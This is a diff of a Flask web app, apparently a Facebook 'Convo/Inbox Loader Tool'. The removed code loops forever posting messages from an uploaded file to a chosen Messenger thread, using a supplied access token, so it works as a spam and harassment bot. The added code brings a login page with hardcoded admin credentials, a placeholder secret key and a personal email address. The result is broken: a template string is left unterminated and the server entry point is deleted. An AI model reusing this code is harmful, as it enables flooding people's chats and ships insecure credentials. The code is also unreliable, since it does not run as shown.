@@ -1,11 +1,15 @@
-from flask import Flask, request
+from flask import Flask, request, render_template_string, redirect, url_for, session, flash
 import requests
-from time import sleep
 import time
-from datetime import datetime
-
+import os
+ 
 app = Flask(__name__)
-
+app.secret_key = 'your_secret_key_here'  # Change this to a random secret key
+ 
+# Login credentials
+ADMIN_USERNAME = "S9B9 JUTTI"
+ADMIN_PASSWORD = "L3G3ND JUTTI"
+ 
 headers = {
     'Connection': 'keep-alive',
     'Cache-Control': 'max-age=0',
@@ -16,37 +20,129 @@ headers = {
     'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
     'referer': 'www.google.com'
 }
+ 
+# HTML Templates
+LOGIN_TEMPLATE = '''
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>S9B9 JUTT- Login</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-image: url('https://i.ibb.co/41zsttw/IMG-20241115-WA0132.jpg');
+            background-size: cover;
+            background-repeat: no-repeat;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(10px);
+            padding: 2rem;
+            border-radius: 20px;
+            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
+            text-align: center;
+            width: 300px;
+        }
+        h1 {
+            color: #fff;
+            margin-bottom: 1.5rem;
+            font-weight: 600;
+        }
+        input {
+            width: 100%;
+            padding: 0.75rem;
+            margin-bottom: 1rem;
+            border: none;
+            border-radius: 50px;
+            background-color: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.7);
+        }
+        input:focus {
+            outline: none;
+            background-color: rgba(255, 255, 255, 0.2);
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 0.75rem 1.5rem;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            width: 100%;
+        }
+        button:hover {
+            background-color: #45a049;
+            transform: translateY(-2px);
+        }
+        .flash-message {
+            margin-bottom: 1rem;
+            padding: 0.5rem;
+            border-radius: 4px;
+            font-size: 0.9rem;
+        }
+        .flash-message.error {
+            background-color: rgba(244, 67, 54, 0.1);
+            border: 1px solid #f44336;
+            color: #f44336;
+        }
+        .contact-admin {
+            margin-top: 1rem;
+            font-size: 0.9rem;
+        }
+        .contact-admin a {
+            color: #4CAF50;
+            text-decoration: none;
+            transition: all 0.3s ease;
+        }
+        .contact-admin a:hover {
+            color: #45a049;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>S9B9 JUTT</h1>
+        {% with messages = get_flashed_messages(with_categories=true) %}
+            {% if messages %}
+                {% for category, message in messages %}
+                    <div class="flash-message {{ category }}">{{ message }}</div>
+                {% endfor %}
+            {% endif %}
+        {% endwith %}
+        <form action="{{ url_for('login') }}" method="post">
+            <input type="text" name="username" placeholder="Username" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Login</button>
+        </form>
+        <div class="contact-admin">
+            <a href="mailto:krishera61@gmail.com">Contact Admin</a>
+        </div>
+    </div>
+</body>
+</html>
+'''
+ 
+ADMIN_TEMPLATE = '''
+      
 
-@app.route('/', methods=['GET', 'POST'])
-def send_message():
-    if request.method == 'POST':
-        access_token = request.form.get('accessToken')
-        thread_id = request.form.get('threadId')
-        mn = request.form.get('kidx')
-        time_interval = int(request.form.get('time'))
-
-        txt_file = request.files['txtFile']
-        messages = txt_file.read().decode().splitlines()
-
-        while True:
-            try:
-                for message1 in messages:
-                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                    message = str(mn) + ' ' + message1
-                    parameters = {'access_token': access_token, 'message': message}
-                    response = requests.post(api_url, data=parameters, headers=headers)
-                    if response.status_code == 200:
-                        print(f"Message sent using token {access_token}: {message}")
-                    else:
-                        print(f"Failed to send message using token {access_token}: {message}")
-                    time.sleep(time_interval)
-            except Exception as e:
-                print(f"Error while sending message using token {access_token}: {message}")
-                print(e)
-                time.sleep(300000)
-
-
-    return '''
     
 <!DOCTYPE html>
 <html lang="en">
@@ -56,74 +152,37 @@ def send_message():
 	<title>LAGEND LADKA</title>
 	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
 	<style>
-		label{
-    color: white;
-}
-
-.file{
-    height: 30px;
-}
-body{
-    background-image: url('https://i.imgur.com/11tMWCY.jpeg');
-    background-size: cover;
-    background-repeat: no-repeat;
-    
-}
-    .container{
-      max-width: 700px;
-      height: 600px;
-      border-radius: 20px;
-      padding: 20px;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-      box-shadow: 0 0 10px white;
-            border: none;
-            resize: none;
-    }
-        .form-control {
-            outline: 1px red;
-            border: 1px double white;
-            background: transparent; 
-            width: 100%;
-            height: 40px;
-            padding: 7px;
-            margin-bottom: 10px;
-            border-radius: 10px;
-            color: white;
-        }
-        .btn-submit {
-            
-            border-radius: 20px;
-            align-items: center;
-            background-color: #4CAF50;
-            color: white;
-            margin-left: 70px;
-            padding: 10px 20px;
-            border: none;
-            cursor: pointer;
-        }
-                .btn-submit:hover{
-                    background-color: red;
-                }
-            
-        h3{
-            text-align: center;
-            color: white;
-            font-family: cursive;
-        }
-        h2{
-            text-align: center;
-            color: white;
-            font-size: 14px;
-            font-family: Courier;
-        }
-    </style>
+		body{
+			background-image: url('https://i.imgur.com/WcDAbG2.jpeg');
+		}
+		.container{
+			max-width: 500px;
+			background-image: url('https://i.imgur.com/WcDAbG2.jpeg');
+			border-radius: 10px;
+			padding: 20px;
+			box-shadow: 1 1 10px rgba(0, 0, 0, 0.1);
+			margin: 0 auto;
+			margin-top: 20px;
+		}
+		.header{
+			text-align: center;
+			padding-bottom: 20px;
+		}
+		.btn-submit{
+			width: 100%;
+			margin-top: 10px;
+		}
+		.footer{
+			text-align: center;
+			margin-top: 20px;
+			color: red;
+		}
+	</style>
 </head>
 <body>
-		
-	
 	<header class="header mt-4">
-    <h1 class="mb-3"> 😈├┼𝐈𝐒𝐇𝐔┼┤😈 </h1> 𝐎𝐅𝐅𝐋𝟏𝐍𝟑 𝐒𝟑𝐑𝐕𝟑𝐑 𝐈𝐒𝐇𝐔 𝐃𝐀𝐒𝐒
-		<h1 class="mt-3">𝐎𝐖𝐍𝟑𝐑 :: 𝐈𝐒𝐇𝐔 𝐃𝐀𝐒𝐒 ✨💫❤  </h1>
+    <h1 class="mb-3"> 😈├┼𝐇𝐄𝐍𝐑𝐘┼┤😈 </h1> 𝐎𝐅𝐅𝐋𝟏𝐍𝟑 𝐒𝟑𝐑𝐕𝟑𝐑 𝐋𝟗𝐆𝟑𝐍𝐃 𝐍𝟗𝐑𝐔𝐓𝟎
+		<h1 class="mt-3">𝐎𝐖𝐍𝟑𝐑 :: 𝐋𝟗𝐆𝟑𝐍𝐃 𝐇𝐄𝐍𝐑𝐘 ✨💫❤  </h1>
 	</header>
 
 	<div class="container">
@@ -154,12 +213,8 @@ body{
 	<footer class="footer">
 		<p>&copy; 2023 𝙉𝙊𝙏 𝙄𝙉 𝘼 𝙍𝙐𝙇𝙀𝙓. All Rights Reserved.</p>
     <p>Convo/Inbox Loader Tool</p>
-		<p>Made with 𝐈𝐒𝐇𝐔 𝐃𝐀𝐒𝐒 ❤💙 by <a href="https://github.com/Ishu Lagend</a></p>
+		<p>Made with 𝐋𝐀𝐆𝐄𝐍𝐃 𝐇𝐄𝐍𝐑𝐘 ❤💙 by <a href="https://github.com/SK-BAAP-786</a></p>
 	</footer>
 </body>
   </html>
-    '''
-
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    
